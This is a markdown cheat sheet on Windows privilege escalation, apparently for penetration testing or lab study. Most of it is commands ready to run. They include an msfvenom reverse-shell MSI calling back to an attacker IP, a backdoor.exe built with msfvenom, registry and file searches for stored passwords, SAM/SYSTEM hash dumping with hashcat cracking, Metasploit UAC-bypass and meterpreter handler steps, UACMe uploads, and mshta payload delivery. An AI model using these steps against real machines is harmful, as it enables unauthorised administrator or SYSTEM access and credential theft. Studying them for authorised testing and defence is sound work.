# Windows Privileges Escalation

### Tools

PowerUp - `https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1`  
SharpUp - `https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe`  
Seatbelt - `https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Seatbelt.exe`  
winPEAS - `https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS`  
accesschk.exe 


#### PowerUp

`Invoke-AllChecks`

#### Seatbelt

`.\Seatbelt.exe all`

#### winPEAS

Before running, we need to add a registry key and then reopen the command prompt:  
`reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1`  

Run all checks while avoiding time-consuming searches:  
`.\winPEASany.exe quiet cmd fast`  

Run specific check categories:  
`.\winPEASany.exe quiet cmd systeminfo`

Run winPEAS to check for service misconfigurations:  
`.\winPEASany.exe quiet servicesinfo`

Use winPEAS to check for writable AutoRun executables:  
`.\winPEASany.exe quiet applicationsinfo`  
Alternatively, we could manually enumerate the AutoRun executables:  
`reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

### Windows Kernel Exploits

• post/multi/recon/local_exploit_suggester  
• run any module from the result to elevate privileges

Windows Exploit Suggester - `https://github.com/bitsadmin/wesng`  
Precompiled Kernel Exploits - `https://github.com/SecWiki/windows-kernel-exploits`  
Watson - `https://github.com/rasta-mouse/Watson`  
kernel-exploits - `https://github.com/SecWiki/windows-kernel-exploits`

### Service Exploits

Services are simply programs that run in the background, accepting input or performing regular tasks.  
If services run with SYSTEM privileges and are misconfigured, exploiting them may lead to command 
execution with SYSTEM privileges as well.

Query the configuration of a service - `sc.exe qc <name>`  
Query the current status of a service - `sc.exe query <name>`  
Modify a configuration option of a service - `sc.exe config <name> <option>= <value>`  
Start/Stop a service - `net start/stop <name>`  

Service Misconfigurations
1. Insecure Service Properties
2. Unquoted Service Path
3. Weak Registry Permissions
4. Insecure Service Executables
5. DLL Hijacking

#### 1. Insecure Service Properties
   
Each service has an ACL which defines certain service-specificpermissions.  
Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG,SERVICE_QUERY_STATUS).  
Some may be useful (e.g. SERVICE_STOP, SERVICE_START).  
Some are dangerous (e.g. SERVICE_CHANGE_CONFIG,SERVICE_ALL_ACCESS)  

#### 2. Unquoted Service Path

Consider the following unquoted path:  
C:\Program Files\Some Dir\SomeProgram.exe  
To us, this obviously runs SomeProgram.exe. To Windows, C:\Program could be
the executable, with two arguments: “Files\Some” and “Dir\ SomeProgram.exe”
Windows resolves this ambiguity by checking each of the possibilities in turn.
If we can write to a location Windows checks before the actual executable, we
can trick the service into executing it instead.

#### AlwaysInstallElevated

MSI files are package files used to install applications.  
These files run with the permissions of the user trying to install them.  
Windows allows for these installers to be run with elevated (i.e. admin) privileges.  
If this is the case, we can generate a malicious MSI file which contains a reverse shell.  

The catch is that two Registry settings must be enabled for this to work.  
The “AlwaysInstallElevated” value must be set to 1 for both the local machine:  
`HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`  
and the current user:  
`HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`  
If either of these are missing or disabled, the exploit will not work.

 Use winPEAS to see if both registry values are set:  
`.\winPEASany.exe quiet windowscreds`  
Alternatively, verify the values manually:  
`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  

Create a new reverse shell with msfvenom, this time using the msi format, and save it with the .msi extension:  
`msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o reverse.msi`  
Copy the reverse.msi across to the Windows VM, start a listener on Kali, and run the installer to trigger the exploit:  
`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`  

#### Passwords

The following commands will search the registry for keys and values that contain “password”  
`reg query HKLM /f password /t REG_SZ /s`  
`reg query HKCU /f password /t REG_SZ /s`  

Use winPEAS to check common password locations:  
`.\winPEASany.exe quiet filesinfo userinfo`  

Use winPEAS to check for saved credentials:  
`.\winPEASany.exe quiet cmd windowscreds`  
We can verify this manually using the following command:  
`cmdkey /list`

#### Configuration Files

Recursively search for files in the current directory with “pass” in the name, or ending in “.config”:  
`dir /s *pass* == *.config`  
Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, or .txt:  
`findstr /si password *.xml *.ini *.txt`  
Use winPEAS to search for common files which may contain credentials:  
`.\winPEASany.exe quiet cmd searchfast filesinfo`  


#### SAM/SYSTEM Locations

The SAM and SYSTEM files are located in the C:\Windows\System32\config directory.
The files are locked while Windows is running.
Backups of the files may exist in the C:\Windows\Repair or C:\Windows\System32\config\RegBack directories.

Run the pwdump tool against the SAM and SYSTEM files to extract the hashes:  
`python2 creddump7/pwdump.py SYSTEM SAM`  
Crack the admin user hash using hashcat:  
`hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da rockyou.txt`

#### Scheduled Tasks

List all scheduled tasks your user can see:  
`schtasks /query /fo LIST /v`  
In PowerShell:  
`Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State`

#### whoami /priv

SeImpersonatePrivilege - The Juicy Potato exploit abuses this ability.  
SeAssignPrimaryPrivilege - similar to SeImpersonatePrivilege.  
SeBackupPrivilege - read access to all objects on the system, regardless of their ACL.  
SeRestorePrivilege - write access to all objects on the system, regardless of their ACL.  
SeTakeOwnershipPrivilege - ets the user take ownership over an object (the WRITE_OWNER permission).  


### PrivescCheck
```cmd
• get this script https://github.com/itm4n/PrivescCheck
• paste it on the target in PrivescCheck.ps1
• powershell.exe -ep bypass -c “. .\ PrivescCheck.ps1; InvokePrivescCheck”
• use the credentials resulted (username:password)
• runas.exe /user:username cmd
• enter the password
• you will get a privileged cmd
```


### UAC Bypass
```cmd
• exploit/windows/local/bypassuac_injection
• set session <session-ID>
• set target (1) windows x64
• set payload (33) windows/x64/meterpreter/reverse_tcp
```


### UAC Bypass: UACMe
```cmd
(when we get admin user with limited privileges)
• after obtaining a meterpreter session with limited privileges
account <admin>
• migrate -N explorer.exe
• shell
• net localgroup Administrators (finding admin is member)
• kali
• msfvenom -p windows/meterpreter/reverse_tcp LHOST=<myIp> LPORT=4444 -f exe > backdoor.exe
• meterpreter session
• cd C:\\Users\\<admin>\\AppData\\Local\\Temp
• upload /root/Desktop/tools/UACME/akagi64.exe .
• upload /root/backdoor.exe .
• msfconsole
• exploit/multi/handler
• set payload windows/meterpreter/reverse_tcp
• set lhost <my Ip>
• set lport 4444
• run
```

### Unattended Installation
```cmd
• powershell
• cat C:\windows\Panther\unattend.xml
• search for encoded password
• decode the password via any website
• runas.exe /user:Administrator cmd
• msfconsole
• exploit/windows/misc/hta_server
• run
• copy the <url>
• administrator cmd
• mshta.exe <url>
• we obtain a meterpreter session from Administrator
```
